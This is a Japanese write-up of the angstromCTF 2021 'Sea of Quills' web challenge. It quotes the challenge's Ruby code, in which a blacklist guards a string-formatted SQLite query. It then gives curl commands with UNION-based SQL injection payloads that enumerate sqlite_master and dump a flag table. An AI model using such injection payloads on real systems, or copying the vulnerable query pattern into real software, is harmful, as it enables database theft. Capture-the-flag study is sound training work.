# Sea of Quills:Web:70pts
Come check out our finest [selection of quills](https://seaofquills.2021.chall.actf.co/)!  
[app.rb](app.rb)  

# Solution
アクセスすると羽ペンが販売されているサイトのようだ。  
パンダが密売されている。  
Home  
[site1.png](site/site1.png)  
/quillsで検索もできるようだ。  
Explore  
[site2.png](site/site2.png)  
配布されたapp.rbの検索部分のソースを見ると以下のような箇所がある。  
```ruby
~~~
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\""]
	
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	
	if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
~~~
```
SQLインジェクションできるがブラックリストをバイパスする必要があるようだ。  
SQL文を無理やり終了はさせられないが、unionで繋げば正常になる。  
以下のようにquillsの個数を見てみる。  
```bash
$ curl -X POST https://seaofquills.2021.chall.actf.co/quills -d "limit=1000&offset=0&cols=count(*),1,2 from quills union select *"
~~~
                                        <img src="6" class="w3 h3">
                                <li class="pb5 pl3">1 <ul><li>2</li></ul></li><br />
~~~
```
imgに入るようで6つである。  
カラム数も表示されているもののみなようだ。  
次に他のテーブルの存在を確認する。  
SQLiteはsqlite_masterを覗いてやればよい。  
```bash
$ curl -X POST https://seaofquills.2021.chall.actf.co/quills -d "limit=1000&offset=0&cols=* from sqlite_master union select 1,2,3,4,5"
~~~
                                        <img src="1" class="w3 h3">
                                <li class="pb5 pl3">2 <ul><li>3</li></ul></li><br />

                                        <img src="table" class="w3 h3">
                                <li class="pb5 pl3">flagtable <ul><li>flagtable</li></ul></li><br />

                                        <img src="table" class="w3 h3">
                                <li class="pb5 pl3">quills <ul><li>quills</li></ul></li><br />
~~~
```
flagtableといういかにもなテーブルがある。  
以下のように中身を見る。  
```bash
$ curl -X POST https://seaofquills.2021.chall.actf.co/quills -d "limit=1000&offset=0&cols=* from flagtable union select 1"
~~~
                                        <img src="1" class="w3 h3">
                                <li class="pb5 pl3"> <ul><li></li></ul></li><br />

                                        <img src="actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}" class="w3 h3">
                                <li class="pb5 pl3"> <ul><li></li></ul></li><br />
~~~
```
flagが入っていた。  

## actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}